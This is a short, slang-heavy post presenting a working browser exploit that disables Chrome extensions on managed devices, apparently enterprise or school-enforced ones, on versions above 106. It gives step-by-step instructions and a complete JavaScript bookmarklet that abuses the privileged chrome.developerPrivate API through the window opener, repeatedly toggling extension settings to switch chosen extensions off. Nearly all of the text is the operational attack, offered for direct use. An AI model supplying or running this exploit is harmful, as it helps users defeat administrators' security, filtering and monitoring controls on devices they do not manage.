basically ltbeef for >106 but realllllly scuffed
uses @# of human brains in my pantryðŸ¡² 's pointblank exploit. @Sharp_Jack made the initial payload

Requires:
bookmarklets
at least 1 extension installed from the chrome web store

Steps:
go to chrome://extensions
click any extension that's installed from the webstore, not one of the enterprise installed extensions
scroll down and click "Open in Chrome Web Store"
spam escape before the page loads. it should be a white screen. if it loads into the chrome webstore you have to try again
run this bookmarklet let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 250);
insert extension ids. i don't feel like explaining how to get them and really you should know by now

if you close the tab the extensions come back

(yes, the skid l33tspeak is 100% neccesary, trust me)
